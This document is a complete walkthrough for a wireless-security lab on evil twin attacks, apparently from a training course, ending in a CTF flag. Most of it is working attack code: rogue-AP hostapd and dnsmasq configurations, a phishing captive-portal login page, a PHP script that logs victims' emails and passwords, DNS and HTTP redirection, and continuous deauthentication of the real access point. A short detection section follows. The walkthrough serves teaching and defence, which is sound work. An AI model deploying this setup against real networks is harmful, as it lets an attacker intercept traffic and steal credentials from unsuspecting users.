# Lab 07: Evil Twin Attacks - Walkthrough

Complete step-by-step solution guide for evil twin attacks.

```
+===============================================================+
|                    WALKTHROUGH GUIDE                           |
+===============================================================+
|  WARNING: This contains complete solutions.                   |
|  Try the exercises yourself first!                            |
+===============================================================+
```

## Legal Disclaimer

```
+=====================================================================+
|                    CRITICAL LEGAL WARNING                            |
+=====================================================================+
|  This walkthrough is for EDUCATIONAL PURPOSES ONLY.                 |
|                                                                      |
|  - Only perform these actions in YOUR OWN ISOLATED lab             |
|  - NEVER create rogue APs that can affect other users              |
|  - Evil twin attacks are ILLEGAL without explicit authorization     |
|  - Credential harvesting is a CRIMINAL OFFENSE                      |
+=====================================================================+
```

## Lab Environment Setup

### Required Equipment

```
Isolated Lab Configuration:

┌─────────────────────────────────────────────────────────────────┐
│                    ISOLATED TEST ENVIRONMENT                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  [Kali Linux Machine]                                           │
│       │                                                          │
│       ├── wlan0 (USB Adapter 1) ──► Evil Twin AP                │
│       │                                                          │
│       └── wlan1 (USB Adapter 2) ──► Deauth/Monitor              │
│                                                                  │
│  [Your Test Router]                                             │
│       │   SSID: TestNetwork                                     │
│       │   Channel: 6                                             │
│       │   This is the "legitimate" AP to impersonate            │
│       │                                                          │
│       ▼                                                          │
│  [Test Client Device]                                           │
│       Your phone/laptop that will connect to evil twin          │
│                                                                  │
│  IMPORTANT:                                                      │
│  - Physically isolate this setup                                │
│  - No neighbors' devices should be able to connect              │
│  - Consider using a Faraday cage or low power                   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Verify Hardware

```bash
# List all wireless interfaces
iwconfig

# Example output:
# wlan0     IEEE 802.11  ESSID:off/any  Mode:Managed
# wlan1     IEEE 802.11  ESSID:off/any  Mode:Managed

# Check AP mode support for evil twin adapter
iw list | grep -A 10 "Supported interface modes"

# You should see:
#   Supported interface modes:
#         * AP
#         * managed
#         * monitor
```

## Exercise 1: Basic Evil Twin - Complete Walkthrough

### Step 1: Stop Network Manager

```bash
# Stop services that might interfere
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# Or use airmon-ng to kill all interfering processes
sudo airmon-ng check kill
```

### Step 2: Configure Network Interface

```bash
# Take down the interface
sudo ip link set wlan0 down

# Set a static IP
sudo ip addr flush dev wlan0
sudo ip addr add 192.168.1.1/24 dev wlan0

# Bring interface back up
sudo ip link set wlan0 up

# Verify configuration
ip addr show wlan0

# Expected output:
# wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
#     inet 192.168.1.1/24 scope global wlan0
```

### Step 3: Create hostapd Configuration

```bash
# Create configuration file
sudo nano /etc/hostapd/evil-twin.conf
```

**Content for evil-twin.conf:**
```ini
# Evil Twin AP Configuration
interface=wlan0
driver=nl80211
ssid=TestNetwork
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

# Open network (no encryption)
wpa=0

# Optional: Clone MAC address of legitimate AP
# bssid=AA:BB:CC:DD:EE:FF
```

### Step 4: Create dnsmasq Configuration

```bash
# Create configuration file
sudo nano /etc/dnsmasq-evil.conf
```

**Content for dnsmasq-evil.conf:**
```ini
# DHCP and DNS configuration for evil twin
interface=wlan0
bind-interfaces

# DHCP range
dhcp-range=192.168.1.10,192.168.1.50,255.255.255.0,12h

# Set default gateway
dhcp-option=3,192.168.1.1

# Set DNS server
dhcp-option=6,192.168.1.1

# Logging
log-queries
log-facility=/var/log/dnsmasq-evil.log
```

### Step 5: Enable IP Forwarding

```bash
# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Or using sysctl
sudo sysctl -w net.ipv4.ip_forward=1
```

### Step 6: Configure iptables (NAT)

```bash
# Flush existing rules
sudo iptables -F
sudo iptables -t nat -F

# Set up NAT (if you want to provide internet via eth0)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Allow forwarding
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

### Step 7: Start the Evil Twin

```bash
# Terminal 1: Start dnsmasq
sudo dnsmasq -C /etc/dnsmasq-evil.conf -d

# Output:
# dnsmasq: started, version 2.85 cachesize 150
# dnsmasq: compile time options: ...
# dnsmasq-dhcp: DHCP, IP range 192.168.1.10 -- 192.168.1.50, lease time 12h

# Terminal 2: Start hostapd
sudo hostapd /etc/hostapd/evil-twin.conf

# Output:
# Configuration file: /etc/hostapd/evil-twin.conf
# Using interface wlan0 with hwaddr 00:11:22:33:44:55 and ssid "TestNetwork"
# wlan0: interface state UNINITIALIZED->ENABLED
# wlan0: AP-ENABLED
```

### Step 8: Verify AP is Broadcasting

From your test client device:
1. Open WiFi settings
2. Look for "TestNetwork"
3. You should see two networks with same name (your evil twin and legitimate)

### Step 9: Connect Test Client

1. On test client, select "TestNetwork" (your evil twin - usually stronger signal)
2. Connect to the open network

**On Kali, you'll see in hostapd output:**
```
wlan0: STA de:ad:be:ef:ca:fe IEEE 802.11: authenticated
wlan0: STA de:ad:be:ef:ca:fe IEEE 802.11: associated (aid 1)
wlan0: AP-STA-CONNECTED de:ad:be:ef:ca:fe
```

**In dnsmasq output:**
```
dnsmasq-dhcp: DHCPDISCOVER(wlan0) de:ad:be:ef:ca:fe
dnsmasq-dhcp: DHCPOFFER(wlan0) 192.168.1.10 de:ad:be:ef:ca:fe
dnsmasq-dhcp: DHCPREQUEST(wlan0) 192.168.1.10 de:ad:be:ef:ca:fe
dnsmasq-dhcp: DHCPACK(wlan0) 192.168.1.10 de:ad:be:ef:ca:fe iPhone
```

### Step 10: Monitor Traffic

```bash
# Monitor traffic passing through evil twin
sudo tcpdump -i wlan0 -v

# Or use Wireshark
sudo wireshark -i wlan0 &
```

## Exercise 2: Captive Portal - Complete Walkthrough

### Step 1: Set Up Web Server

```bash
# Install Apache if not present
sudo apt install apache2

# Create portal directory
sudo mkdir -p /var/www/html/portal
```

### Step 2: Create Login Page

```bash
sudo nano /var/www/html/portal/index.html
```

**Content:**
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TestNetwork - WiFi Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #333;
            font-size: 24px;
        }
        .logo p {
            color: #666;
            margin-top: 10px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e1e1;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }
        .terms {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Welcome to TestNetwork</h1>
            <p>Please sign in to access WiFi</p>
        </div>
        <form action="/portal/capture.php" method="POST">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" required placeholder="your@email.com">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter password">
            </div>
            <button type="submit">Connect to WiFi</button>
        </form>
        <p class="terms">By connecting, you agree to our Terms of Service</p>
    </div>
</body>
</html>
```

### Step 3: Create Credential Capture Script

```bash
sudo nano /var/www/html/portal/capture.php
```

**Content:**
```php
<?php
// Credential capture script - FOR EDUCATIONAL USE ONLY

$log_file = '/var/log/evil_twin_creds.log';

// Get timestamp
$timestamp = date('Y-m-d H:i:s');

// Get client info
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// Get submitted credentials
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

// Format log entry
$log_entry = "[$timestamp] IP: $ip | Email: $email | Password: $password | UA: $user_agent\n";

// Write to log file
file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

// Redirect to success page
header('Location: /portal/success.html');
exit;
?>
```

### Step 4: Create Success Page

```bash
sudo nano /var/www/html/portal/success.html
```

**Content:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Connected!</title>
    <meta http-equiv="refresh" content="3;url=http://www.google.com">
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #4CAF50;
            color: white;
        }
        .message {
            text-align: center;
        }
        h1 { font-size: 48px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="message">
        <h1>Connected!</h1>
        <p>You will be redirected shortly...</p>
    </div>
</body>
</html>
```

### Step 5: Configure Redirect Rules

```bash
# Update dnsmasq to redirect all DNS queries
sudo nano /etc/dnsmasq-evil.conf
```

**Add this line:**
```ini
# Redirect ALL DNS queries to our IP
address=/#/192.168.1.1
```

### Step 6: Configure iptables for Captive Portal

```bash
# Redirect all HTTP traffic to our portal
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80

# Allow established connections
sudo iptables -A INPUT -i wlan0 -p tcp --dport 80 -j ACCEPT
```

### Step 7: Set File Permissions

```bash
# Create log file with proper permissions
sudo touch /var/log/evil_twin_creds.log
sudo chmod 666 /var/log/evil_twin_creds.log
sudo chown www-data:www-data /var/log/evil_twin_creds.log
```

### Step 8: Restart Services

```bash
# Restart Apache
sudo systemctl restart apache2

# Restart dnsmasq (kill old instance first)
sudo pkill dnsmasq
sudo dnsmasq -C /etc/dnsmasq-evil.conf -d &

# hostapd should still be running
```

### Step 9: Test Captive Portal

1. Connect test client to evil twin "TestNetwork"
2. Open browser and navigate to any HTTP site (e.g., http://example.com)
3. You should be redirected to the login portal
4. Enter test credentials
5. Check the log file:

```bash
sudo cat /var/log/evil_twin_creds.log

# Output:
# [2024-01-15 14:30:45] IP: 192.168.1.10 | Email: test@test.com | Password: testpass123 | UA: Mozilla/5.0...
```

## Exercise 3: Combined Attack - Complete Walkthrough

### Setup

```
Attack Configuration:

┌─────────────────────────────────────────────────────────────────┐
│  wlan0: Evil Twin AP (TestNetwork)                              │
│  wlan1mon: Deauth attacks against legitimate AP                 │
└─────────────────────────────────────────────────────────────────┘
```

### Step 1: Start Evil Twin (wlan0)

Follow Exercise 1 steps to have evil twin running.

### Step 2: Enable Monitor Mode on Second Adapter

```bash
# Enable monitor mode on wlan1
sudo airmon-ng start wlan1

# Verify
iwconfig wlan1mon
# Should show: Mode:Monitor
```

### Step 3: Identify Legitimate AP

```bash
# Scan for the legitimate TestNetwork
sudo airodump-ng wlan1mon

# Note the BSSID and channel of the REAL AP
# Example: 11:22:33:44:55:66 on channel 6
```

### Step 4: Deauth Legitimate AP

```bash
# Continuously deauth the real AP
sudo aireplay-ng -0 0 -a 11:22:33:44:55:66 wlan1mon

# Clients will disconnect from real AP
# They will see two "TestNetwork" options
# Many will auto-connect to your evil twin (stronger signal)
```

### Step 5: Monitor Connections

Watch hostapd output for new connections:
```
wlan0: AP-STA-CONNECTED de:ad:be:ef:ca:fe
wlan0: AP-STA-CONNECTED ab:cd:ef:12:34:56
```

## Exercise 4: Detection - Complete Walkthrough

### Method 1: Identify Evil Twins with Airodump-ng

```bash
# Scan for networks
sudo airodump-ng wlan0mon

# Look for:
# - Multiple APs with same SSID
# - Different BSSIDs for same network name
# - Unusual MAC addresses (random vendor)
# - Different encryption (open vs WPA2)
```

### Method 2: Signal Analysis

```
Detecting Evil Twin by Signal:

Legitimate AP (known location):
- Consistent signal strength from known direction
- Expected power level

Evil Twin (attacker nearby):
- Unusually strong signal
- Signal from unexpected direction
- May fluctuate as attacker moves
```

### Method 3: Using Kismet

```bash
# Start Kismet
sudo kismet -c wlan0mon

# Navigate to web interface: http://localhost:2501
# Look for alerts:
# - "APSPOOF" - Multiple APs with same SSID
# - "BSSTIMESTAMP" - Timestamp anomalies
# - "DEAUTHFLOOD" - Deauth attacks detected
```

### Method 4: Check for Open Network When Expected Secure

If your network is WPA2, but you see an open version:
- Likely evil twin
- Do NOT connect

## Cleanup

```bash
# Stop hostapd (Ctrl+C in its terminal)

# Stop dnsmasq
sudo pkill dnsmasq

# Flush iptables rules
sudo iptables -F
sudo iptables -t nat -F

# Disable IP forwarding
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward

# Restore network interface
sudo ip addr flush dev wlan0
sudo ip link set wlan0 down

# Stop monitor mode on wlan1
sudo airmon-ng stop wlan1mon

# Restart NetworkManager
sudo systemctl start NetworkManager

# Verify normal connectivity
ping -c 3 google.com
```

## Summary

You've successfully learned:

1. **Evil Twin Setup**: hostapd + dnsmasq configuration
2. **Captive Portal**: Web server with credential capture
3. **Combined Attack**: Evil twin + deauth for forced migration
4. **Detection**: Identifying rogue access points

## Key Takeaways

- Evil twin attacks exploit trust in SSID names
- Deauth helps force clients to reconnect to attacker's AP
- Captive portals can harvest credentials
- Detection is possible through monitoring and vigilance
- WPA-Enterprise and proper authentication help defend

---

**Flag:** `FLAG{3v1l_tw1n_pwn3d}`
